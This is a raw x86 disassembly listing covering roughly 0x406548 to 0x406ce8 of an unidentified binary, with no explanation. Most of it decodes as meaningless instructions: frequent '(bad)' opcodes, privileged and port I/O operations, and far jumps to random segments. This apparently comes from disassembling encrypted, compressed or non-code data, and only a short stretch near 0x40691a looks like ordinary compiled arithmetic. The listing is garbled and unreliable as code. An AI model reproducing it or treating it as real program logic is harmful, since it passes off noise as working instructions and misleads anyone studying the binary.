  406548:	xor    DWORD PTR [esi-0x55aab707],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	inc    eax
  406557:	mov    eax,ds:0xdac327ff
  40655c:	ins    DWORD PTR es:[edi],dx
  40655d:	jmp    0x4e32cc47
  406562:	xchg   esp,eax
  406563:	push   es
  406564:	fcmovbe st,st(5)
  406566:	xchg   cx,ax
  406568:	enter  0xfa5b,0xcf
  40656c:	or     DWORD PTR [ebx+0x48],esi
  40656f:	pop    ebp
  406570:	out    dx,al
  406571:	and    ebp,ebx
  406573:	retf   0xbd40
  406576:	mov    ds:0xbef2829c,eax
  40657b:	sub    esp,DWORD PTR [edi+esi*2]
  40657e:	jmp    0x3d72:0xc9c2483
  406585:	cmp    BYTE PTR [ebp-0x1c],bh
  406588:	es clc 
  40658a:	icebp  
  40658b:	mov    DWORD PTR [esi+0x6f],edi
  40658e:	lock adc edi,esi
  406591:	xor    ebp,DWORD PTR [edx-0x6f]
  406594:	or     eax,0xc1ae5336
  406599:	(bad)  [esi+eax*2]
  40659c:	retf   
  40659d:	or     al,0xb2
  40659f:	mov    bl,0xd8
  4065a1:	je     0x406539
  4065a3:	push   esi
  4065a4:	cmp    DWORD PTR ds:0x7c7d7c6d,0xffffffb6
  4065ab:	(bad)  [ebx+0x11]
  4065ae:	jmp    0xff339136
  4065b3:	push   ds
  4065b4:	mov    cx,0x297
  4065b8:	ror    DWORD PTR [edi],cl
  4065ba:	push   esp
  4065bb:	jne    0x4065e7
  4065bd:	mov    bh,0xaf
  4065bf:	jmp    0x4065ef
  4065c1:	mov    ds:0x391fa33a,eax
  4065c6:	stc    
  4065c7:	sbb    DWORD PTR [edx],esp
  4065c9:	push   0xffffff90
  4065cb:	jns    0x4065aa
  4065cd:	lods   eax,DWORD PTR ds:[esi]
  4065ce:	push   esp
  4065cf:	inc    edi
  4065d0:	and    cl,BYTE PTR [ebx]
  4065d2:	cmc    
  4065d3:	test   eax,0x686f0d14
  4065d8:	xor    cl,cl
  4065da:	loope  0x40659d
  4065dc:	std    
  4065dd:	push   eax
  4065de:	out    0xc4,eax
  4065e0:	in     eax,dx
  4065e1:	(bad)  
  4065e2:	xchg   esi,eax
  4065e3:	ror    ebx,1
  4065e5:	add    al,0x9c
  4065e7:	xor    bh,BYTE PTR [ebp-0x3c9a5da0]
  4065ed:	rcr    DWORD PTR [ebx-0xc2bde29],1
  4065f3:	mov    bl,0x6b
  4065f5:	sbb    esp,ebx
  4065f7:	scas   eax,DWORD PTR es:[edi]
  4065f8:	push   cs
  4065f9:	and    ah,BYTE PTR ds:[ebx-0x42]
  4065fd:	or     al,0xb3
  4065ff:	pop    edi
  406600:	inc    ebp
  406601:	cmp    bl,BYTE PTR [esp+esi*4]
  406604:	sub    BYTE PTR [edx],0xa3
  406607:	into   
  406608:	pop    ecx
  406609:	xchg   ebp,eax
  40660a:	inc    esp
  40660b:	and    eax,0x5a69407a
  406610:	add    BYTE PTR [esi+0x5d8c84f0],cl
  406616:	jmp    0xe5fbabfb
  40661b:	sub    esi,DWORD PTR [ecx]
  40661d:	icebp  
  40661e:	ja     0x4065cb
  406620:	nop
  406621:	pusha  
  406622:	int3   
  406623:	sbb    edi,ebx
  406625:	ins    DWORD PTR es:[edi],dx
  406626:	xchg   ebx,eax
  406627:	add    al,0x48
  406629:	or     al,0x6d
  40662b:	je     0x40663d
  40662d:	fmul   QWORD PTR [edx+0x4b]
  406630:	jp     0x406600
  406632:	push   ds
  406633:	hlt    
  406634:	fdiv   QWORD PTR [eax+0x4b]
  406637:	push   edi
  406638:	inc    ebp
  406639:	mov    ecx,0xed5ff936
  40663e:	xchg   esp,eax
  40663f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406640:	in     al,0xca
  406642:	sub    dl,BYTE PTR [eax]
  406644:	shl    BYTE PTR [ebp-0x67],cl
  406647:	inc    ch
  406649:	retf   0x4129
  40664c:	mov    dl,0xf7
  40664e:	jno    0x406672
  406650:	jp     0x4066a6
  406652:	and    DWORD PTR [edx-0x1eaf26c7],edx
  406658:	mov    esi,0x397972f1
  40665d:	hlt    
  40665e:	ins    DWORD PTR es:[edi],dx
  40665f:	adc    eax,0x19b6d5d0
  406664:	mov    ds,WORD PTR [ebp-0x6fc17152]
  40666a:	mov    eax,ds:0xa5d0597c
  40666f:	ja     0x4066b1
  406671:	pop    ebx
  406672:	loope  0x4066c0
  406674:	add    edx,edi
  406676:	(bad)  
  406677:	psubsw mm5,mm5
  40667a:	cmp    DWORD PTR [ebx-0x74],edx
  40667d:	or     al,0x7a
  40667f:	imul   esi,DWORD PTR [ebp+0x7647110b],0x74969494
  406689:	clc    
  40668a:	add    ah,BYTE PTR [ecx]
  40668c:	pop    esi
  40668d:	dec    eax
  40668e:	and    eax,0xed92b652
  406693:	stc    
  406694:	fmul   DWORD PTR [ebx]
  406696:	dec    esp
  406697:	pop    ss
  406698:	or     al,BYTE PTR [ebp+0x49e7e3a5]
  40669e:	sbb    eax,0xa7d7c173
  4066a3:	rcr    DWORD PTR [ebx+edx*2+0x16444851],cl
  4066aa:	push   ss
  4066ab:	xor    ah,cl
  4066ad:	push   0xc6ec4c88
  4066b2:	popa   
  4066b3:	sub    BYTE PTR [ebx],ah
  4066b5:	dec    edx
  4066b6:	mul    DWORD PTR [ebp+0x5a]
  4066b9:	and    BYTE PTR [edi+0x1f],dl
  4066bc:	and    BYTE PTR [edi-0x7c695d97],al
  4066c2:	dec    esp
  4066c3:	ins    BYTE PTR es:[edi],dx
  4066c4:	repnz aas 
  4066c6:	ins    DWORD PTR es:[edi],dx
  4066c7:	pop    edx
  4066c8:	sbb    al,0xef
  4066ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066cb:	pushf  
  4066cc:	(bad)  
  4066cd:	rol    BYTE PTR [ebp-0x721237bb],1
  4066d3:	push   edx
  4066d4:	fnstenv [edx+0x417817f3]
  4066da:	and    BYTE PTR [esp+edx*8-0x1c],al
  4066de:	test   DWORD PTR [ebp+0x30],eax
  4066e1:	rol    bh,0x69
  4066e4:	mov    ecx,DWORD PTR [esi]
  4066e6:	sub    eax,DWORD PTR [edx+esi*8]
  4066e9:	mov    ah,0x12
  4066eb:	ret    
  4066ec:	mov    edx,0x392f5707
  4066f1:	jb     0x406677
  4066f3:	bound  ebp,QWORD PTR [edx+ecx*8]
  4066f6:	pop    esp
  4066f7:	(bad)  
  4066f8:	cld    
  4066f9:	stc    
  4066fa:	mov    bl,dl
  4066fc:	test   al,bl
  4066fe:	ror    BYTE PTR [ebp+0x46],1
  406701:	inc    edx
  406702:	mov    dl,0x59
  406704:	jmp    0x2de6:0xb98bee42
  40670b:	daa    
  40670c:	hlt    
  40670d:	pop    ds
  40670e:	sub    ebx,DWORD PTR [edi-0xf]
  406711:	jecxz  0x40672e
  406713:	jno    0x40678b
  406715:	cld    
  406716:	fisub  WORD PTR [esi+eax*4+0x44]
  40671a:	pop    ebx
  40671b:	lahf   
  40671c:	stos   DWORD PTR es:[edi],eax
  40671d:	mov    DWORD PTR [edx-0x72],esp
  406720:	cmp    DWORD PTR [edi],esi
  406722:	stc    
  406723:	ds dec esi
  406725:	fwait
  406726:	mov    cl,0x80
  406728:	(bad)  
  406729:	in     al,dx
  40672a:	dec    edi
  40672b:	in     eax,dx
  40672c:	jnp    0x4067a0
  40672e:	mov    ch,0x77
  406730:	adc    BYTE PTR [edi-0x75],dl
  406733:	fiadd  DWORD PTR [edi]
  406735:	push   ecx
  406736:	arpl   WORD PTR [eax],bp
  406738:	aas    
  406739:	jns    0x40670c
  40673b:	xor    eax,0x89ebc67f
  406740:	push   ebp
  406741:	and    bh,cl
  406743:	xor    BYTE PTR [edi-0x65],dh
  406746:	rol    dl,0x5b
  406749:	push   ds
  40674a:	push   edi
  40674b:	(bad)  
  40674c:	mov    esi,DWORD PTR [edx+0x3e]
  40674f:	dec    esi
  406750:	jo     0x4067be
  406752:	pop    es
  406753:	xor    DWORD PTR [eax-0x31],0x33
  406757:	xchg   esi,eax
  406758:	sbb    dl,ah
  40675a:	xlat   BYTE PTR ds:[ebx]
  40675b:	repz adc DWORD PTR [edi-0x1e6984ba],esi
  406762:	jae    0x40670d
  406764:	fadd   st,st(1)
  406766:	pop    ecx
  406767:	rcl    al,1
  406769:	sbb    al,0xb7
  40676b:	sub    ebx,DWORD PTR [edi]
  40676d:	cwde   
  40676e:	add    BYTE PTR [esi],bl
  406770:	dec    ebx
  406771:	pop    eax
  406772:	xor    dl,bh
  406774:	repnz fst QWORD PTR [eax+edx*8]
  406778:	add    ebx,DWORD PTR [edx]
  40677a:	mov    bp,0x4ee5
  40677e:	arpl   WORD PTR [edi+0x2f],bp
  406781:	out    0x80,al
  406783:	inc    esp
  406784:	xchg   ebp,eax
  406785:	and    ebx,ebp
  406787:	cmp    DWORD PTR [ebx],0x166bb57f
  40678d:	mov    esi,0xce52a941
  406792:	or     esp,ebx
  406794:	das    
  406795:	mov    esp,0x7e0e2625
  40679a:	fldcw  WORD PTR [ebp+0x1]
  40679d:	or     bh,dh
  40679f:	adc    esi,DWORD PTR [esi]
  4067a1:	and    eax,0xc117ebe9
  4067a6:	test   ch,0xef
  4067a9:	and    eax,0x6002f395
  4067ae:	push   eax
  4067af:	sbb    eax,DWORD PTR ds:[edx+0x5289dfdb]
  4067b6:	das    
  4067b7:	jle    0x4067a6
  4067b9:	sbb    al,BYTE PTR [edx-0x62]
  4067bc:	outs   dx,BYTE PTR ds:[esi]
  4067bd:	test   DWORD PTR [edi+0x1e966703],ebp
  4067c3:	jno    0x4067bc
  4067c5:	xchg   ebx,eax
  4067c6:	retf   0xe8aa
  4067c9:	loopne 0x40677e
  4067cb:	sub    DWORD PTR [edi-0x38a49dd],ebp
  4067d1:	aam    0xd5
  4067d3:	pop    ds
  4067d4:	cs dec eax
  4067d6:	es data16 rsm 
  4067da:	add    BYTE PTR [ebx+esi*1+0x33],al
  4067de:	inc    ecx
  4067df:	adc    al,0x75
  4067e1:	xchg   edi,eax
  4067e2:	push   edi
  4067e3:	inc    edi
  4067e4:	pushf  
  4067e5:	fcom   st(7)
  4067e7:	int3   
  4067e8:	inc    esi
  4067e9:	(bad)  
  4067ea:	addr16 ret 
  4067ec:	das    
  4067ed:	mov    gs,WORD PTR ds:0x169cf92f
  4067f3:	femms  
  4067f5:	inc    edx
  4067f6:	das    
  4067f7:	pop    edi
  4067f8:	rol    BYTE PTR ds:0x58daabcf,1
  4067fe:	jmp    0xe60bd7eb
  406803:	cmp    DWORD PTR [ecx+0x2d],edx
  406806:	adc    al,0x1a
  406808:	pop    es
  406809:	ins    DWORD PTR es:[edi],dx
  40680a:	fimul  WORD PTR [ebp+0x20170316]
  406810:	in     al,dx
  406811:	aaa    
  406812:	movd   mm7,DWORD PTR [ecx+ecx*8]
  406816:	inc    esp
  406817:	xor    al,ah
  406819:	mov    eax,ds:0xae572ee2
  40681e:	push   esi
  40681f:	pop    ecx
  406820:	(bad)  
  406821:	adc    eax,0x49dd8073
  406826:	jmp    0x805257f4
  40682b:	pop    ebp
  40682c:	dec    esi
  40682d:	lea    edi,[edx]
  40682f:	neg    DWORD PTR [eax+eiz*2]
  406832:	adc    eax,DWORD PTR [esi]
  406834:	ss dec eax
  406836:	std    
  406837:	cli    
  406838:	retf   
  406839:	adc    dl,bh
  40683b:	bound  edi,QWORD PTR [ebx]
  40683d:	(bad)  
  40683e:	fwait
  40683f:	xor    esp,DWORD PTR [eax+0x9d1461b]
  406845:	push   edx
  406846:	ror    BYTE PTR [edi],0xa2
  406849:	(bad)  
  40684a:	adc    ecx,ebx
  40684c:	mov    al,BYTE PTR [eax-0x43]
  40684f:	mov    dl,0x8c
  406851:	mov    eax,0x4361994c
  406856:	aam    0x5c
  406858:	dec    edx
  406859:	add    DWORD PTR [ebp-0x17],0xfffffff9
  40685d:	push   ecx
  40685e:	and    al,0x80
  406860:	(bad)  
  406861:	ins    BYTE PTR es:[edi],dx
  406862:	pop    ss
  406863:	popa   
  406864:	sub    BYTE PTR [eax-0x1d],0x2f
  406868:	ret    0xb8c5
  40686b:	test   DWORD PTR [ebx+0x2551d1f2],ebx
  406871:	cmp    BYTE PTR [edi+0x5a],al
  406874:	sahf   
  406875:	adc    al,0x2b
  406877:	xor    ah,BYTE PTR ds:0x115519b9
  40687d:	adc    BYTE PTR [edx+0x56],al
  406880:	fsubr  st,st(3)
  406882:	or     cl,ch
  406884:	xor    eax,0x2a36c1a7
  406889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40688a:	rcr    DWORD PTR [edx-0x3cf3b55d],1
  406890:	test   DWORD PTR [esi+0x76826972],edx
  406896:	je     0x4068b1
  406898:	std    
  406899:	enter  0x6ba1,0x90
  40689d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40689e:	xor    eax,0xfc985b02
  4068a3:	sub    al,0x19
  4068a5:	add    al,0xdf
  4068a7:	push   ds
  4068a8:	inc    dx
  4068aa:	jo     0x40687f
  4068ac:	pop    esi
  4068ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ae:	dec    ebp
  4068af:	and    BYTE PTR [ebp+0x1b0c47d7],al
  4068b5:	fdiv   st(3),st
  4068b7:	push   esp
  4068b8:	fidivr DWORD PTR [esi]
  4068ba:	add    eax,0x9d053217
  4068c0:	lock rol BYTE PTR [ebp-0xbd061dc],cl
  4068c7:	stos   BYTE PTR es:[edi],al
  4068c8:	call   0x8685:0x9e94969b
  4068cf:	arpl   WORD PTR [ecx+0x3b12bc84],bp
  4068d5:	adc    BYTE PTR [edi+ebx*8-0x42],al
  4068d9:	push   es
  4068da:	xchg   ecx,eax
  4068db:	nop
  4068dc:	test   al,0xbc
  4068de:	xchg   ebp,eax
  4068df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068e0:	into   
  4068e1:	ins    DWORD PTR es:[edi],dx
  4068e2:	js     0x4068ba
  4068e4:	pop    edx
  4068e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e7:	xor    DWORD PTR [ecx],esp
  4068e9:	shr    BYTE PTR [edx+0x3d],1
  4068ec:	mov    dl,0xca
  4068ee:	push   es
  4068ef:	ror    DWORD PTR [ebp-0x3b],0xe4
  4068f3:	out    dx,al
  4068f4:	ficom  WORD PTR [eax+0x31]
  4068f7:	cmp    al,0xf7
  4068f9:	mov    ds:0x89e5356e,eax
  4068fe:	(bad)  
  4068ff:	mov    ebp,0x88bc33bb
  406904:	push   esi
  406905:	lahf   
  406906:	enter  0x16d4,0xac
  40690a:	mov    DWORD PTR [ebx],ebx
  40690c:	fidivr DWORD PTR [edi]
  40690e:	out    dx,al
  40690f:	adc    DWORD PTR [esi],edx
  406911:	jge    0x406967
  406913:	ins    DWORD PTR es:[edi],dx
  406914:	mov    esi,0xe1c11e98
  406919:	push   ds
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xbcd79895
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	rcr    dl,1
  406982:	pop    ss
  406983:	loope  0x406945
  406985:	jge    0x4069e0
  406987:	retf   
  406988:	(bad)  
  406989:	rcl    edx,1
  40698b:	cmp    BYTE PTR [edi+0x675252d3],dh
  406991:	xchg   ecx,eax
  406992:	mov    bh,0x15
  406994:	loopne 0x406957
  406996:	push   0x4e5e17af
  40699b:	push   ss
  40699c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40699d:	test   al,0xcd
  40699f:	fisubr WORD PTR [esi+eiz*2+0x7f]
  4069a3:	pop    ebx
  4069a4:	cmp    BYTE PTR [edx+0x36],dh
  4069a7:	(bad)  
  4069a8:	inc    esp
  4069a9:	and    DWORD PTR [ecx+0x12],eax
  4069ac:	pushf  
  4069ad:	pushf  
  4069ae:	and    eax,0xf3f0d1d3
  4069b3:	pop    ecx
  4069b4:	dec    eax
  4069b5:	mov    al,BYTE PTR [ebp-0x46]
  4069b8:	lods   eax,DWORD PTR ds:[esi]
  4069b9:	xchg   edx,eax
  4069ba:	leave  
  4069bb:	addr16 jne 0x4069cf
  4069be:	jl     0x4069e6
  4069c0:	call   0x8d88ef86
  4069c5:	mov    bl,0xec
  4069c7:	sti    
  4069c8:	in     eax,0xab
  4069ca:	xor    cl,bl
  4069cc:	mov    DWORD PTR [ecx],0xa921359e
  4069d2:	ins    DWORD PTR es:[edi],dx
  4069d3:	add    BYTE PTR [eax],0x53
  4069d6:	mov    eax,ds:0x6dd65d41
  4069db:	iret   
  4069dc:	sub    al,BYTE PTR [ecx]
  4069de:	jns    0x406a0d
  4069e0:	or     eax,0x93a864bb
  4069e5:	adc    al,0xf
  4069e7:	imul   ebx,DWORD PTR [ecx-0x25],0xc48f7080
  4069ee:	adc    eax,0x757945fe
  4069f3:	pop    esp
  4069f4:	(bad)  
  4069f5:	lahf   
  4069f6:	ins    BYTE PTR es:[edi],dx
  4069f7:	cmp    bl,dl
  4069f9:	dec    ecx
  4069fa:	jge    0x4069dc
  4069fc:	sbb    ebp,DWORD PTR [edi+esi*1-0x11e99db6]
  406a03:	jbe    0x406a23
  406a05:	loop   0x406a4a
  406a07:	mov    BYTE PTR [edx+edi*4+0x4e],al
  406a0b:	cmp    DWORD PTR [eax+0x7a],0x15
  406a0f:	cwde   
  406a10:	mov    WORD PTR [ebp-0xd1cfe57],ss
  406a16:	push   0xd3ab461e
  406a1b:	aad    0x34
  406a1d:	mov    ebp,DWORD PTR [edx+eax*2-0x31]
  406a21:	(bad)  
  406a23:	ret    
  406a24:	ins    DWORD PTR es:[edi],dx
  406a25:	pop    ebx
  406a26:	jmp    0x1464:0x29f8d436
  406a2d:	nop
  406a2e:	mov    eax,ds:0x9f547130
  406a33:	mov    ebp,DWORD PTR [ebx-0x4c]
  406a36:	retf   0x3359
  406a39:	mov    DWORD PTR [ebx],esi
  406a3b:	mov    BYTE PTR [esi-0x4b],bh
  406a3e:	shl    BYTE PTR [ebp+0x1],1
  406a41:	mov    ds,WORD PTR [edi-0x75]
  406a44:	dec    edx
  406a45:	xchg   ebp,eax
  406a46:	xor    eax,0x1528a504
  406a4b:	into   
  406a4c:	rcr    dh,1
  406a4e:	mov    eax,0xa5a5e1cc
  406a53:	(bad)  
  406a54:	jne    0x406a07
  406a56:	popf   
  406a57:	ins    BYTE PTR es:[edi],dx
  406a58:	add    edi,DWORD PTR [esi-0x1362d37c]
  406a5e:	(bad)  
  406a5f:	aad    0xff
  406a61:	jae    0x406ac9
  406a63:	fiadd  DWORD PTR [ecx+eiz*4+0x3d]
  406a67:	xchg   edx,eax
  406a68:	mov    DWORD PTR ds:0xb8950cd9,eax
  406a6e:	xchg   ebp,eax
  406a6f:	adc    esi,edi
  406a71:	(bad)  
  406a72:	fincstp 
  406a74:	dec    eax
  406a75:	inc    esp
  406a76:	push   ebp
  406a77:	mov    dl,0x3c
  406a79:	inc    esp
  406a7a:	mov    ebx,0xa7a0701d
  406a7f:	push   0xffffff8e
  406a81:	cwde   
  406a82:	cs push ds
  406a84:	push   edi
  406a85:	mov    esi,DWORD PTR [ecx+eiz*1+0x38]
  406a89:	lods   eax,DWORD PTR ds:[esi]
  406a8a:	pop    es
  406a8b:	pop    esp
  406a8c:	sbb    al,0xa
  406a8e:	retf   0x9e83
  406a91:	sbb    BYTE PTR [ebp-0x18],al
  406a94:	aam    0x73
  406a96:	inc    eax
  406a97:	mov    eax,0xb5186dfd
  406a9c:	in     al,0x32
  406a9e:	inc    edx
  406a9f:	adc    bh,ah
  406aa1:	fisub  WORD PTR [esi]
  406aa3:	leave  
  406aa4:	mov    bh,0xf5
  406aa6:	or     eax,0x66995482
  406aab:	xchg   BYTE PTR [eax],dl
  406aad:	mov    ah,0xd6
  406aaf:	sub    esi,eax
  406ab1:	icebp  
  406ab2:	or     esp,DWORD PTR [edx]
  406ab4:	retf   0xfa1
  406ab7:	pop    ebx
  406ab8:	aad    0x33
  406aba:	push   ds
  406abb:	xor    al,0x1
  406abd:	call   0xc53e1938
  406ac2:	pop    edx
  406ac3:	sbb    eax,0x7ab2e6cd
  406ac8:	stos   DWORD PTR es:[edi],eax
  406ac9:	push   es
  406aca:	daa    
  406acb:	push   es
  406acc:	jle    0x406acf
  406ace:	and    BYTE PTR [ebp+0x48c35bc0],bl
  406ad4:	mov    dh,0x3d
  406ad6:	test   BYTE PTR [edi],0xc7
  406ad9:	sti    
  406ada:	adc    dl,ch
  406adc:	aam    0x4b
  406ade:	add    bl,BYTE PTR [ebx+0x55ea47f1]
  406ae4:	repnz (bad)
  406ae7:	mov    ebx,ss
  406ae9:	or     BYTE PTR [edx-0x175d7b74],0x38
  406af0:	sbb    eax,0x86090473
  406af5:	cmp    ebx,ebx
  406af7:	lahf   
  406af8:	ficom  DWORD PTR [ebx-0x60]
  406afb:	out    dx,eax
  406afc:	inc    edi
  406afd:	scas   al,BYTE PTR es:[edi]
  406afe:	mov    esp,0xe7fdf944
  406b03:	sub    eax,0x4cd0afe1
  406b08:	sahf   
  406b09:	fadd   QWORD PTR [esi+eiz*2]
  406b0c:	aaa    
  406b0d:	dec    esi
  406b0e:	and    al,ch
  406b10:	inc    ecx
  406b11:	pop    es
  406b12:	sub    al,0x32
  406b14:	inc    esi
  406b15:	xchg   ecx,eax
  406b16:	add    eax,0x10a0049b
  406b1b:	sbb    DWORD PTR [edx+0x5e33d446],edx
  406b21:	jb     0x406b12
  406b23:	mov    BYTE PTR [ebx+ecx*2+0x5b],ah
  406b27:	nop
  406b28:	sti    
  406b29:	add    BYTE PTR [eax-0x5d],0x1e
  406b2d:	jns    0x406b37
  406b2f:	inc    esi
  406b30:	pop    edi
  406b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b32:	mov    ecx,0x61a5ac16
  406b37:	out    dx,al
  406b38:	(bad)  
  406b39:	push   0x131321f3
  406b3e:	xor    BYTE PTR [eax],cl
  406b40:	push   0x2b
  406b42:	or     BYTE PTR [edx-0x58af6c1c],bl
  406b48:	in     eax,dx
  406b49:	xor    al,bl
  406b4b:	imul   eax,DWORD PTR [esi-0x6821509f],0xf8a51cd4
  406b55:	cmp    DWORD PTR [edx],ebp
  406b57:	loope  0x406ae2
  406b59:	div    BYTE PTR [ecx+0x26b4882f]
  406b5f:	push   ecx
  406b60:	jns    0x406b2d
  406b62:	sahf   
  406b63:	bound  edi,QWORD PTR [edi+0x49]
  406b66:	mov    al,ds:0x9a8b199f
  406b6b:	retf   0x8f1b
  406b6e:	(bad)  
  406b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b72:	shl    BYTE PTR [edx],cl
  406b74:	arpl   bp,ax
  406b76:	outs   dx,DWORD PTR ds:[esi]
  406b77:	pop    esi
  406b78:	cmp    DWORD PTR ds:[esi+edi*8-0x74268fc9],0x603e70c6
  406b84:	mov    bh,0x86
  406b86:	ja     0x406c05
  406b88:	fisubr DWORD PTR [eax+eiz*2]
  406b8b:	pop    es
  406b8c:	retf   
  406b8d:	mov    dl,0xef
  406b8f:	and    dh,bl
  406b91:	stos   DWORD PTR es:[edi],eax
  406b92:	push   ecx
  406b93:	inc    ebp
  406b94:	mov    al,ds:0xb86a025b
  406b99:	fdivr  DWORD PTR [edi+0x3d9eb246]
  406b9f:	out    dx,al
  406ba0:	scas   eax,DWORD PTR es:[edi]
  406ba1:	xchg   edi,eax
  406ba2:	mov    eax,0x43e398f7
  406ba7:	xchg   edx,eax
  406ba8:	pop    DWORD PTR [ebx+0x29c284b7]
  406bae:	gs mov BYTE PTR ss:[edi-0x1f2bf2a6],al
  406bb6:	inc    edx
  406bb7:	loop   0x406b6a
  406bb9:	ds mov ebx,0x267df37
  406bbf:	push   esp
  406bc0:	adc    al,0x4f
  406bc2:	cld    
  406bc3:	inc    ecx
  406bc4:	popf   
  406bc5:	xor    ebp,DWORD PTR [esp+esi*8-0x6d37f141]
  406bcc:	lahf   
  406bcd:	data16 jecxz 0x406bc2
  406bd0:	not    ebx
  406bd2:	ds test esp,esi
  406bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bd6:	and    DWORD PTR [ebx-0x5aae7129],esp
  406bdc:	loop   0x406c01
  406bde:	fld    QWORD PTR [edx+edi*1-0x78]
  406be2:	push   ecx
  406be3:	mov    dh,0xca
  406be5:	push   cs
  406be6:	sahf   
  406be7:	mov    esi,0xd9286596
  406bec:	inc    eax
  406bed:	adc    BYTE PTR [edi-0x7f],ch
  406bf0:	loop   0x406ba6
  406bf2:	leave  
  406bf3:	pop    ebp
  406bf4:	mov    eax,0x449b7497
  406bf9:	cli    
  406bfa:	sahf   
  406bfb:	xor    dl,cl
  406bfd:	pop    esp
  406bfe:	sbb    al,0x82
  406c00:	sub    al,BYTE PTR cs:[esi+0x73b5eedd]
  406c07:	adc    ah,BYTE PTR [ebp-0x48]
  406c0a:	pop    edi
  406c0b:	mov    ebp,0xdee4bbc3
  406c10:	and    DWORD PTR [edx-0x66b64cd6],ecx
  406c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c17:	push   0x3c550a29
  406c1c:	mov    WORD PTR [ecx-0x59fb8b17],?
  406c22:	cmp    ebx,DWORD PTR [edx+eax*1-0x32a7c0c3]
  406c29:	mov    cl,0x30
  406c2b:	aad    0x2f
  406c2d:	mov    eax,ds:0x27a8a579
  406c32:	arpl   WORD PTR [ecx+0x47],sp
  406c35:	jne    0x406bf8
  406c37:	mov    cl,0x41
  406c39:	sbb    DWORD PTR [ebx-0x48ba0174],edx
  406c3f:	pop    edi
  406c40:	sub    dl,0xf9
  406c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c44:	xor    esi,edx
  406c46:	mov    ebp,0x7f3ae621
  406c4b:	sbb    edi,edi
  406c4d:	inc    edx
  406c4e:	inc    esp
  406c4f:	add    bl,cl
  406c51:	shr    DWORD PTR [eax-0x63],1
  406c54:	mov    eax,0xd3e57a84
  406c59:	cli    
  406c5a:	rcl    ah,cl
  406c5c:	inc    ebp
  406c5d:	and    eax,0x4774417e
  406c62:	inc    ebp
  406c63:	push   esi
  406c64:	fimul  DWORD PTR [ebx+ebp*1]
  406c67:	pop    ebx
  406c68:	ds mov dh,0xb9
  406c6b:	xchg   ecx,eax
  406c6c:	out    dx,al
  406c6d:	in     eax,dx
  406c6e:	cmc    
  406c6f:	fwait
  406c70:	sub    ah,BYTE PTR [edx]
  406c72:	loope  0x406bfa
  406c74:	sbb    al,0xcf
  406c76:	repz cld 
  406c78:	pop    ecx
  406c79:	cs add cl,bh
  406c7c:	das    
  406c7d:	adc    DWORD PTR [edi-0x1b311825],0xcfe9034c
  406c87:	cmc    
  406c88:	xchg   ebx,eax
  406c89:	push   ds
  406c8a:	push   ecx
  406c8b:	mov    al,ds:0xc558298e
  406c90:	out    0x82,eax
  406c92:	and    DWORD PTR [ebp-0x4ca0fb],0xffffffa8
  406c99:	pop    ebp
  406c9a:	gs hlt 
  406c9c:	mov    cl,0x6b
  406c9e:	sub    BYTE PTR [edx-0x17],0xdb
  406ca2:	shr    BYTE PTR [ebx+0x6e],1
  406ca5:	in     al,dx
  406ca6:	sub    DWORD PTR [esi],esi
  406ca8:	cmc    
  406ca9:	xchg   BYTE PTR [ebx+0x11ab30bf],dl
  406caf:	icebp  
  406cb0:	mov    ss,WORD PTR [edx-0x49]
  406cb3:	loop   0x406cd5
  406cb5:	ins    BYTE PTR es:[edi],dx
  406cb6:	add    BYTE PTR [ebx+0x5e],ch
  406cb9:	(bad)  
  406cba:	mov    bh,0xe4
  406cbc:	jne    0x406cff
  406cbe:	or     al,0xdb
  406cc0:	ds out 0x35,eax
  406cc3:	inc    ebx
  406cc4:	retf   0xc894
  406cc7:	icebp  
  406cc8:	hlt    
  406cc9:	pop    es
  406cca:	xor    DWORD PTR [edi+0x35],edx
  406ccd:	fldcw  WORD PTR [edi-0x7b3ed688]
  406cd3:	popf   
  406cd4:	popa   
  406cd5:	jne    0x406ccb
  406cd7:	push   es
  406cd8:	imul   BYTE PTR [ebx+0x51]
  406cdb:	pop    esi
  406cdc:	les    eax,FWORD PTR [ecx-0x516b771a]
  406ce2:	mov    edx,0xd10dc2cb
  406ce7:	push   edi
  406ce8:	xchg   edx,eax
